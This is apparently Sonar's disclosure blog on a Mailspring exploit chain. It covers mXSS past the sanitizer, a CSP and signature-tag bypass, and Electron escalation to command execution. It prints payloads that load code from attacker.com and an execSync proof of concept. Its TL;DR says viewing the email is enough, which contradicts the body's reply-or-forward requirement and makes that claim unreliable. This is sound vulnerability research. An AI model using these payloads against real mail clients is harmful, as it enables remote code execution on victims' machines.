---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-11_reply-to-calc-the-attack-chain-to-compromise-mailspring.md
original_filename: 2024-03-11_reply-to-calc-the-attack-chain-to-compromise-mailspring.md
title: 'Reply to calc: The Attack Chain to Compromise Mailspring'
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: 3a3a23813c9ca97b07a792d9e3622220e63b5fcbe4d390f20425196457dbb75c
text_sha256: f945e238af774d71818e3b91fb144966eab3ac740ede45a06769157eea6b7fb8
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: false
---

# Reply to calc: The Attack Chain to Compromise Mailspring

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-11_reply-to-calc-the-attack-chain-to-compromise-mailspring.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: False
- Raw SHA256: `3a3a23813c9ca97b07a792d9e3622220e63b5fcbe4d390f20425196457dbb75c`
- Text SHA256: `f945e238af774d71818e3b91fb144966eab3ac740ede45a06769157eea6b7fb8`


## Content

---
title: "Reply to calc: The Attack Chain to Compromise Mailspring"
page_title: "Reply to calc: The Attack Chain to Compromise Mailspring | Sonar"
url: "https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/"
final_url: "https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/"
authors: ["Yaniv Nizry (@YNizry)"]
programs: ["Mailspring"]
bugs: ["Mutation XSS", "RCE", "Electron", "CSS exfiltration"]
publication_date: "2024-03-11"
added_date: "2024-05-11"
source: "pentester.land/writeups.json"
original_index: 387
---

## TL;DR overview

  * Mailspring's Electron-based desktop email client contains an attack chain where a malicious email triggers mXSS that escapes HTML sanitization and then exploits an unsafe Electron configuration to execute arbitrary OS commands on the victim's machine.
  * The attack requires only that the victim view the email—no clicks or interactions needed—making it an exceptionally dangerous exploit for a widely used desktop application.
  * The mXSS component exploits a parser differential between the sanitizer's HTML parser and the Electron renderer's parser, allowing a payload that appears safe during sanitization to mutate into executable JavaScript on render.
  * Mailspring users should ensure they are running the patched version; the research is documented in Sonar's mXSS cheatsheet as a canonical example of how parser differentials escalate from XSS to OS-level code execution.

Mailspring, formerly known as [nylas-mail](https://github.com/nylas/nylas-mail), is a popular email client application that gives users a fast and efficient way to manage their email accounts. It is a free and open-source program for Windows, Mac, and Linux operating systems. Mailspring comes with a variety of advanced features, such as snoozing emails, scheduling messages, email tracking, and more. It also supports a wide range of email services, including Gmail, Yahoo, Outlook, and more. With its user-friendly interface and powerful functionality, Mailspring has become a popular choice for those looking for a reliable and versatile email client.

Continuing our effort to improve open-source security and enhance our Code Quality technology, we decided to research and evaluate the security of the Mailspring desktop application. Considering its popularity, security issues in the application have a high impact potential. In this blog, we will present our research and findings. 

## Impact

Mailspring versions before 1.11.0 are susceptible to several vulnerabilities, enabling an attacker to execute arbitrary code when a victim tries to _reply to_ or _forward_ a malicious email.

Mailspring version 1.11.0 employs mitigations to prevent exploitation. However, the underlying vulnerability has not been fixed as of today.

## Technical Details - CVE-2023-47479 

In the following section, we will explain the technical details of the vulnerabilities, which are tracked as CVE-2023-47479. We will describe how an attacker can bypass some mitigations to ultimately achieve code execution when a user replies to or forwards a malicious email. 

## mXSS Background

Mutation Cross-Site Scripting (mXSS) is a sophisticated variation of the well-known Cross-Site Scripting (XSS) vulnerability. When an application needs to safely render the user’s input as HTML, to support some HTML features, sanitization would be the solution. Allowing specific tags and attributes while stripping or encoding others. Unfortunately, this is not a straightforward task since HTML is a syntax-tolerant language that may change or “mutate” when parsing. mXSS takes advantage of that by providing a payload that seems innocent initially when parsing (during the sanitization process) but mutates it to a malicious one when re-parsing it (in the final stage of displaying the content).

### mXSS in the Email Renderer

Before rendering and showing an email to the user, Mailspring sanitizes the content with a [built-in sanitizer](https://github.com/Foundry376/Mailspring/blob/a3aecf628a77d51badaa7a8860acffab0f1afcb3/app/src/services/sanitize-transformer.ts#L527). The sanitizer uses `DOMParser` and, according to a predefined list, will accept, remove, or replace tags and content. Problems occur when the sanitizer changes a disallowed tag after the parsing is done, causing the resulting content to be parsed differently.

For example, we will use the following email content:

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/0b99ad14-05c4-4081-9e69-a98306f0f4bc/image11.png)

Parsing the given string to a DOM tree will result in an `a` tag inside the `style` as expected within “[foreign content](https://html.spec.whatwg.org/#parsing-main-inforeign)”, this is because `style` is handled differently in [SVG](https://infra.spec.whatwg.org/#svg-namespace)/[MathML](https://infra.spec.whatwg.org/#mathml-namespace) namespaces:

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/7b231ce9-49b3-44e3-8505-d8a949c20795/image9.png)

Mailspring doesn’t allow `svg` tags and will [replace](https://github.com/Foundry376/Mailspring/blob/a3aecf628a77d51badaa7a8860acffab0f1afcb3/app/src/services/sanitize-transformer.ts#L478) them with `span` tags during the sanitization. We covered the risk of “Desanitization” (the act of changing and interfering with the sanitizer’s output) in previous blogs where we encountered other vulnerabilities that follow this dangerous behavior: 

  * [Pitfalls of Desanitization: Leaking Customer Data from osTicket](https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/)
  * [Code Vulnerabilities Put Proton Mails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/)
  * [Code Vulnerabilities Put Skiff Emails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk/)
  * And more

Because Mailspring continues iterating over the manipulated sanitizer’s output using the same parsed DOM tree, it would still seem as if there were a foreign content tag (`svg` and not `span`):

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/40dad30b-0f11-4462-987d-20bf25d5b777/image10.png)

This is why the sanitizer can’t see the malicious tag, but later, when embedding the result in the page, the `style` tag won't be inside a “[foreign content](https://html.spec.whatwg.org/#parsing-main-inforeign)” and thus closes where the `title` attribute used to be:

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/cea3ce10-58d3-4939-bf47-4edd45b007f7/image5.png)

We can see our injected tag in the rendered content. But it is inside a sandboxed iframe, stopping it from executing any JavaScript code.

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/672f1c55-d035-4240-a4df-0d7d8f15ed6b/image15.png)

### Bypassing the mitigations

#### Sandboxed Iframe

There is not much an attacker can do inside a sandboxed iframe, but we noticed that when a user replies to or forwards an email, the content of it will be rendered again outside of the sandboxed iframe.

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/84b30d05-f723-450c-bbb3-a8a91756fb5c/image14.png)

However, the injected JavaScript code will still not run because of a Content Security Policy in the main window:

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/42f93e67-032e-4eaa-b829-42c398dd3103/image12.png)![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/0019bb4e-1a1a-41db-90b1-cb0515d7a8b2/image13.png)

#### Content Security Policy Bypass 

When evaluating this policy, we noticed that there is a misconfiguration:

Copy to clipboard
  
  
  <meta http-equiv="Content-Security-Policy" content="default-src * mailspring:; script-src 'self' chrome-extension://react-developer-tools; style-src * 'unsafe-inline' mailspring:; img-src * data: mailspring: file:;">

Because `default-src` is set to `*` and there's no `object-src` override, an attacker can execute code with an `object` tag. This is limited to JavaScript files served via the `http`, `https`, `ws`, and `wss` protocols by default.

In addition to that, `script-src 'self'` allows using a `script` tag with a local file as a `src` to execute JavaScript code. This works because Electron, the underlying technology behind Mailspring, serves the UI via the `file://` protocol. To abuse this, an attacker must control a file on the victim’s computer and point to it via a script’s `src` attribute.

However, when sending a new payload that uses a malicious `object` tag to bypass the CSP, replying to/forwarding it, would mysteriously remove our tag. This did not happen for the initial payload with the `img` tag, so what is going on here?

Copy to clipboard
  
  
  <svg><style><a title="</style><object data='https://attacker.com/payload'>">

Email body:

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/1b51107f-0e82-4f21-92bb-35aed76e3229/image2.png)

Reply-to/forward content:

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/970ff562-8168-4d6b-9e60-e4a9824d46f6/image4.png)

There must be another sanitization when replying to or forwarding an email.

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/7016e464-8cf0-4f7f-9212-efc3b019e8df/image1.png)

#### reply-to/forward sanitization bypass

Drilling down to the component that handles the reply/forward window, we came across [inflates-draft-client-id.jsx](https://github.com/Foundry376/Mailspring/blob/1.10.8/app/src/decorators/inflates-draft-client-id.tsx#L77). The `draft` content still contains our `object` tag at this point but will later be removed, so this content is before the 2nd sanitization. 

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/5b703a97-efe0-4cc4-be80-6a58a9ca3b63/image8.png)

Looking at this HTML draft snippet, we understand that Mailspring adds content to the window, such as the user’s mail signature, custom CSS, timestamp, etc. The `signature` tag at the start of the draft caught our attention. Since it's a custom tag and appended before the replied/forwarded malicious email content, maybe the sanitization there is different? 

Indeed, embedding the malicious input in a `signature` tag avoided the 2nd sanitization. As a result, this payload allows the execution of arbitrary JavaScript code:

Copy to clipboard
  
  
  <svg><style><a title="</style><signature><object data='https://attacker.com/payload'></object></signature>">

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/45ab3e6e-a910-4576-8c6e-82c3b986d96d/image7.png)

### From XSS to RCE

The [main](https://github.com/Foundry376/Mailspring/blob/3be72eee5c10a43f6fb9924ab1e9a33bb0f5216e/app/src/browser/mailspring-window.ts#L100) window of Mailspring uses `nodeIntegration: true` and `contextIsolation: false`, meaning any JavaScript code that runs in this context can also access the internal NodeJS objects and thus execute arbitrary code on the machine. Because the payload until this point has been executed in the origin of `attacker.com`, which blocks the attacker from accessing the main parent window due to the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy), an attacker would need to find a way to escalate the impact from XSS to RCE. 

From here, we came up with two different vectors:

#### Outdated Electron V8 Vulnerability

Mailspring runs on an outdated electron, thus a chromium version that is susceptible to [CVE-2022-1364](https://nvd.nist.gov/vuln/detail/CVE-2022-1364), and potentially other 1days (running `window.navigator.userAgent` on the dev tools gives the following value):

Copy to clipboard
  
  
  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Mailspring/1.10.8 Chrome/98.0.4758.141 Electron/17.4.0 Safari/537.36

An attacker can use known exploits to gain full command execution regardless of Electron’s origin isolation.

#### CSS Exfiltration

The XSS shown above is executed from an external website origin, stopping the JavaScript from accessing the `top` window due to the [Same-origin-policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy). For a window to be able to access its parent, both should be same-origin. Since Mailspring runs on the `file://` scheme, any framed window (`object`, `iframe`, `embed`, etc.) that is also from the `file://` scheme can access the main window (and then node internals).

For that, an attacker needs to have control over a file on the machine; this can be achieved with attachment files. After sending an email with an attachment, we saw that the files are moved to a randomly [generated directory](https://github.com/Foundry376/Mailspring/blob/3be72eee5c10a43f6fb9924ab1e9a33bb0f5216e/app/src/flux/stores/attachment-store.ts#L67) under `…/Mailspring/files/<random-id>.substr(0, 2)/<random>.substr(2, 2)/<random-id>/attachment_file`. This path is not reflected in the DOM and cannot be guessed.

But sending an [inline image](https://stackoverflow.com/questions/6706891/embedding-image-in-html-email) (with CID) will cause the path to be reflected in the DOM. Using that, an attacker can use known [CSS exfiltration techniques](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection), given that CSS is allowed by Mailspring’s sanitizer, to extract the random path of the controlled file. Then use the same XSS as before but point the `object`’s `data` tag to the controlled file. Since it's the same origin as the main window, accessing `parent` and running arbitrary node commands is possible.

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/f4ba163b-458d-4704-934e-2776734d74d4/image3.png)

The POC:

  1. Attacker sets up a CSS exfiltration server.
  2. Attacker sends an email with the CSS exfiltration payload and an inline “image” which is actually the following malicious HTML page: `<script>top.require('child_process').execSync('open -a Calculator')</script>`
  3. When the victim views the email, the payload “image” path is extracted.
  4. Attacker sends a second email with the mXSS payload pointing to the extracted path: `<svg><style><a title="</style><signature><object data='**extracte_path**'></object></signature>"></style>`
  5. When a victim tries to reply or forward the message, a calculator will show up.

![](https://assets-eu-01.kc-usercontent.com:443/ef593040-b591-0198-9506-ed88b30bc023/ab432326-a456-4886-86cb-910dc82f95d1/image6.png)

### Patch

We tried contacting the maintainers in various ways, but due to unresponsiveness, the only implemented [fix](https://github.com/Foundry376/Mailspring/commit/5126294f589d94231ea8ec31a94847ccdf6f4dcb) was hardening the CSP.

Copy to clipboard
  
  
  + object-src none; media-src mailspring:; manifest-src none;

Despite the lack of proper attention and fix, there are several takeaways developers can take from these findings:

  * Avoid interfering with data after the sanitization ([Desanitization](https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/)).
  * Follow the [official Electron Security documentation](https://www.electronjs.org/docs/latest/tutorial/security) which covers [node integration](https://www.electronjs.org/docs/latest/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content), [context isolation](https://www.electronjs.org/docs/latest/tutorial/security#3-enable-context-isolation), [file protocol](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), and more.
  * Ensure your mitigation steps, such as [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), are configured correctly.

## Timeline

**Date**| **Action**  
---|---  
2023-04-27| We report all issues to the vendor, including our disclosure policy  
2023-05-11| We Ping the vendor  
2023-05-23| We Ping the vendor using a personal email address  
2023-06-26| We open a discrete issue on GitHub  
2023-07-04| The vendor acknowledges the report  
2023-07-29| The CSP policy is hardened  
2023-08-09| We ping the vendor, offering help with the fixes  
2023-09-05| We ping the vendor again with no success  
2024-03-09| We notify the vendor about the release of this blog  
  
## Summary

In this blog, we covered a vulnerability chain that attackers might exploit to achieve RCE on a victim’s computer simply by manipulating them to click “reply-to” or “forward” from a malicious email. We explained the importance of avoiding the dangerous [Desanitization](https://www.sonarsource.com/blog/pitfalls-of-desanitization-leaking-customer-data-from-osticket/) pattern and outlined the significance of a strong CSP.

To help you implement these critical aspects in your own code, Sonar provides a vast range of security rules, such as [S5728](https://sonarsource.github.io/rspec/#/rspec/S5728), which ensures that a default-src CSP directive is set. This reduces the impact of XSS vulnerabilities and follows the Code Quality principle, which emphasizes the creation of clear and maintainable software. This not only facilitates the detection and resolution of vulnerabilities throughout the development process but also reduces the risk of introducing security weaknesses that malicious actors could exploit.

## Related Blog Posts

  * [Code Vulnerabilities Put Proton Mails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/)
  * [Remote Code Execution in Tutanota Desktop due to Code Flaw](https://www.sonarsource.com/blog/remote-code-execution-in-tutanota-desktop-due-to-code-flaw/)
  * [Code Vulnerabilities Put Skiff Emails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk/)
